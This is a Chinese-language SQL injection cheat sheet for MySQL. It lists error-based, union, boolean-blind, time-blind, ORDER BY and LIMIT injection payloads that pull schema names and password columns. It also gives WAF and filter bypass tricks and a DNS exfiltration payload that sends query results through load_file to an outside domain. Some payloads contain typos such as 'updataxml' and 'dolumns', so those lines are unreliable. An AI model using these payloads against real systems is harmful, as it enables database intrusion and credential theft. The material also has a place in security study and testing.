# SQL注入
## 通过注入的到内容：
```
数据库版本信息，用户名，数据库名，表名，列名，数据，全部变量（show global variables）,使用变量 （select @@variable_name）
version(),database(),schema_name,user(),table_name,column_name,data
mysql的information_schema(mysql5.1以上才有)表：
information_schema.schemata:存储数据库名 schema_name
information_schema.tables:存储表名 table_name
information_schema.columns:存储列名 column_name
```
## 基于报错的SQL注入
### floor()报错
```
格式
select count(*), concat(注入点,floor(rand(0)*2)) x from information_schema.tables group by x;
查用户：
select * from test where id = 1 and (select 1 from (select count(*), concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)
查所有数据库名
select * from test where id = 1 and (select 1 from (select count(*), concat((select group_concat(schema_name) from information_schema.schemata),floor(rand(0)*2))x from information_schema.tables group by x)a)
查数据库名：
select * from test where id = 1 and (select 1 from (select count(*), concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)
查表名：
select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=database()), floor(rand(0)*2))x from information_schema.tables group by x)a;
查字段：
select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),floor(rand(14)*2))x from information_schema.tables group by x)a
查数据：
select 1 from (select count(*),concat((select group_concat(password) from users),floor(rand(14)*2))x from information_schema.tables group by x)a;
//floor():返回小于等于指定数字的最大整数
//concat():连接几个字符串
//group_concat:将表的同一列的所有行的数据在一行中输出
//rand():生成一个[0,1)的随机数，若指定随机数种子则会生成一段重复的序列数
//count():返回表中的行数
```

### extractvalue()和updatexml()报错
```
格式：
select * from test where id=1 and (extractvalue(1,concat(0x7e,(注入点),0x7e)));
select * from test where id=1 and (updataxml(1,concat(0x7e,(注入点),0x7e),1));

查看用户：
select * from test where id=1 and (extractvalue(1,concat(0x7e,user(),0x7e)));
select * from test where id=1 and (updatexml(1,concat(0x7e,user(),0x7e),1));
查所有数据库名
select * from test where id=1 and (extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e)));
select * from test where id=1 and (updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1));
查看数据库名：
select * from test where id=1 and (extractvalue(1,concat(0x7e,database(),0x7e)));
select * from test where id=1 and (updatexml(1,concat(0x7e,database(),0x7e),1));
查看表名(数据有多行时，在查询语句后添加limit来进行限制以防因此报错)：
select * from test where id=1 and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)));
select * from test where id=1 and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1));
查看列名：
select * from test where id=1 and (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name= 'guestbook') ,0x7e),1));
select * from test where id=1 and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name= 'guestbook') ,0x7e),1));
查看数据：
select * from test where id=1 and (extractvalue(1,concat(0x7e,(select group_concat(comment_id) from guestbook),0x7e),1));
select * from test where id=1 and (updatexml(1,concat(0x7e,(select group_concat(comment_id) from guestbook),0x7e),1));
//xml格式错误使得MySQL报错
// extractvalue(xml_document, xpath_expression)
// updatexml(xml_document, xpath_expression, new_value)

geometrycollection()、multipoint()、polygon()、multipolygon()、linestring()、multilinestring()格式：
select * from test where id=1 and geometrycollection((select * from (select * from (select注入点)a)b));
select * from test where id=1 and multipoint((select * from (select * from (select注入点)a)b));
select * from test where id=1 and polygon((select * from (select * from (select注入点)a)b));
select * from test where id=1 and multilpolygon((select * from (select * from (select注入点)a)b));
select * from test where id=1 and linestring((select * from (select * from (select注入点)a)b));
select * from test where id=1 and multilinestring((select * from (select * from (select注入点)a)b));
exp()格式：
select * from test where id=1 and exp(~(select * from (select 注入点)a));
```
## Union注入（需注意要使查询条件不存在才会回显注入的值）
```格式：
select * from test where id=1 union 注入点
猜字段（union需要两个查询结果的列相同）
select * from test where id=1 order by 1;
查用户名：
select * from test where id=1 union select 1,user(),3;
查所有数据库名
select * from test where id=1 union select 1,schema_name,3 from information_schema.schemata;
查当前数据库名：
select * from test where id=1 union select 1,database(),3;
查表名：
select * from test where id-=1 union select 1,(select table_name from information_schema.tables where table_schema=database()),3;
查列名：
select * from test where id=1 union select 1,(select column_name from information_schema.dolumns where table_schema=database() and table_name=’user’),3;
查数据：
select * from test where id=1 union select 1, group_concat(comment_id)from guestbook;
```
## 布尔盲注
```
数字，英文字母ascii值的范围：
0-9：30-39 A-Z:65-90 a-z:97-122 

相关函数：
length(),ascii(),count(),substr(),mid(),right(),left(),reverse(),trim()
//length():返回字符串长度 //ascii:返回字符的ascii值 //count():计数 //substr():截取字符串
//mid():substr的同等替换 //right():从右边开始截取字符 //left():从左边开始截取字符 //:reverse()逆转顺序
//trim():从字符串中删除空格 //database():返回当前数据库的名称 //user():返回当前数据库的用户名

使用组合：
ascii(right(string,1))
ascii(reverse(left(string,1)))
substr(string,1,1)
mid(string,1,1)

格式：
select * from tset where id=1 and 注入点;
注入流程：
求数据库的数量
selec * from test where id=1 and (select count(*) from information_schema.schemata)>6
求数据库的长度
select * from test where id=1 and length(select schema_name from information_schema.schemata limit 0,1)>10;
求数据库的ascii值
select * from test where id=1 and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))>97;
求当前数据库长度
select * from test where id=1 and length(database())>4;
求当前数据库表的ASCII
select * from test where id=1 and ascii(substr(database(),1,1))>97;
求当前数据库中表的个数
select * from test where id=1 and (select count(table_name) from information_schema.tables where table_schema=database())>100;
求当前数据库中其中一个表名的长度
select * from test where id=1 and length(select table_name from information_schema.tables where table_schema=database() limit0,1)>8;
求当前数据库中其中一个表名的ASCII
select * from test where id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))>97;
求列名的数量
select * from test where id=1 and count(select column_name from information_schema.columns where table_schema=database() and table_name=guest)>10
求列名的长度
select * from test where id=1 and length(select column_name from information_schema.columns where table_schema=database() and table_name=guest limit 0,1)>4;
求列名的ASCII
select * from test where id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=guest limit 0,1),1,1))>97;
求字段的数量
select * from test where id=1 and count(select comment from guest)>10;
求字段内容的长度
select * from test where id=1 and length(select comment from guest limit 0,1)>4;
求字段内容对应的ASCII
select * from test where id=1 and ascii(substr((select comment from guest limit 0,1),1,1))>97;

```
## 基于时间的盲注
通过响应时间来判断是否注入成功
相关函数：
`benchmark(count,expr):重复count次expr	benchmark(1000000,md5(1))
sleep(num):延迟num秒后返回			sleep(10)
笛卡尔积
get_lock锁`
格式：
```
select * from test where id=1 and if(注入点,sleep(10),1);
```
## order by 字段注入
### 使用报错注入 
```
updatexml(1,if(1=2,1,(表达式)),1)
extractvalue(1,if(1=2,1,(表达式)));
```
### 使用布尔盲注
知道列名时：
`order by if(表达式，coulumn_name_1,column_name_2)`
不知道列名时：
`order by if(表达式,1,(select id from information_schema.tables))`
```
?sort=1' and if(ascii(substr(database(),1,1))=115,username,password)--+
```
### 使用rand函数盲注
当表达式为true和false时，排序结果是不同的，所以就可以使用rand()函数进行盲注了
```
?sort=rand(ascii(left(database(),1))=115)'--+
```
### 使用时间盲注
```
order by 2 and if(表达式,1,sleep(1))
order by 2 and if(length(database())>6,sleep(2),3)
```
### 数据外带(DNS查询注入和SMB外带注入)
```
select load_file('\\\\www.owner.com\\a.txt') //现DNS查询
```
需要搭建一条NS服务器
```
select load_file(concat('\\\\',注入点,'.demo.com\\test.txt'));
select load_file(concat('\\\\',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'.demo.com\\test.txt'));
```
## limit字段注入
limit 关键字后面还可跟PROCEDURE和 INTO两个关键字，但是 INTO 后面写入文件需要知道绝对路径以及写入shell的权限，因此利用比较难，因此这里以PROCEDURE为例进行注入
```
select id from users order by id desc limit 0,1 procedure analyse(1,1);
 select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
```
## 非常规注入
### 异或注入
MySQL数据库，字符和数字进行比较时：

+ 如果字符以数字开头，MySQL会将其转换为相应的数字类型进行比较。
例如，'123'会被转换为整数123，'12.34'会被转换为浮点数12.34。
+ 如果字符以非数字字符开头，MySQL会将其转换为0进行比较。
例如，'abc'会被转换为整数0，'12abc'也会被转换为整数12。

#### 构造语句
```
select * from test where id=0^(ascii(substr(注入点,0,1))>97)
0^(ascii(substr((select(flag)from(flag)),0,1))>97) 空格过滤
```
### 利用截断
## ByPass
### 过滤逗号
替代:join 、limit
### 过滤空格
空格替代：
%09：表示制表符（Tab）。 %0a：表示换行符（LF）。 %0c：表示换页符（FF）。 %0d：表示回车符（CR）。 %0b：表示垂直制表符（VT）。 %a0：表示非断行空格（Non-breaking Space） ()
### 过滤不等号
替代:<>
### 过滤limit
替代offset
### 过滤了database、information、table
利用MySQL数据库自带的空间索引函数
### 过滤select
拼接构造该关键字
### 语句固定为order by *结尾
使用if语句进行盲注
### 添加垃圾信息
`union/**/select`
`/*!union*//*!select*/`
## MySQL恶意文件读取
## Redis4.x CVE
### 主从复制写shell
### Redis结合SSRF
## MySQL UDF提权


